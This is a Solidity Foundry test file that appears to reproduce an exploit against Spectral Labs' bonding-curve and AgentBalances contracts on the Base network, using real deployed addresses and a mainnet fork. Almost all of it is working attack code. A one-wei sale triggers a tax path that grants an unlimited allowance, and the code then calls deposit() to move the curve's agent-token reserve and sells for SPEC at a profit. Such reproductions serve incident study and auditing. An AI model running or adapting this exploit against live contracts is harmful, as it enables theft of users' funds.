// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ISpectralBonding {
    function swapExactSPECForTokens(
        uint256 specIn,
        uint256 minTokensOut,
        address token,
        uint256 deadline
    ) external;
    function swapExactTokensForSPEC(
        uint256 tokensIn,
        uint256 minSpecOut,
        address token,
        uint256 deadline
    ) external;
}

interface IAgentBalances {
    function deposit(
        address from,
        address token,
        address agentToken,
        uint256 amount
    ) external;
}

contract SpectralLabsAttacker {
    IERC20 private constant SPEC_TOKEN = IERC20(0x96419929d7949D6A801A6909c145C8EEf6A40431);
    IERC20 private constant AGENT_TOKEN = IERC20(0x0E3b1dF900375BcD7D32dc1bbEE676D104B60e89);
    ISpectralBonding private constant BONDING = ISpectralBonding(0xD84B6CAccFCc9FA5F48c6277C40FaC0620f1d0c2);
    IAgentBalances private constant AGENT_BALANCES = IAgentBalances(0x618E213c290e4B9B58749c502Ed1981dB3FAdf55);

    function exploit() external {
        SPEC_TOKEN.approve(address(BONDING), type(uint256).max);
        AGENT_TOKEN.approve(address(BONDING), type(uint256).max);

        BONDING.swapExactSPECForTokens(2 ether, 0, address(AGENT_TOKEN), block.timestamp + 1);

        // Selling one wei invokes AgentToken's tax path, which mistakenly
        // grants AgentBalances an unlimited allowance from the bonding curve.
        BONDING.swapExactTokensForSPEC(1, 0, address(AGENT_TOKEN), block.timestamp + 1);

        uint256 reserve = AGENT_TOKEN.balanceOf(address(BONDING));
        AGENT_BALANCES.deposit(address(BONDING), address(AGENT_TOKEN), address(AGENT_TOKEN), reserve - 1e9);

        BONDING.swapExactTokensForSPEC(3_500_000_000, 0, address(AGENT_TOKEN), block.timestamp + 1);
    }
}

contract SpectralLabsExploitTest is Test {
    IERC20 private constant SPEC_TOKEN = IERC20(0x96419929d7949D6A801A6909c145C8EEf6A40431);

    function testExploit() public {
        vm.createSelectFork("https://mainnet.base.org", 23_115_864);

        SpectralLabsAttacker attacker = new SpectralLabsAttacker();
        deal(address(SPEC_TOKEN), address(attacker), 2 ether);
        attacker.exploit();

        assertGt(SPEC_TOKEN.balanceOf(address(attacker)), 1000 ether);
    }
}
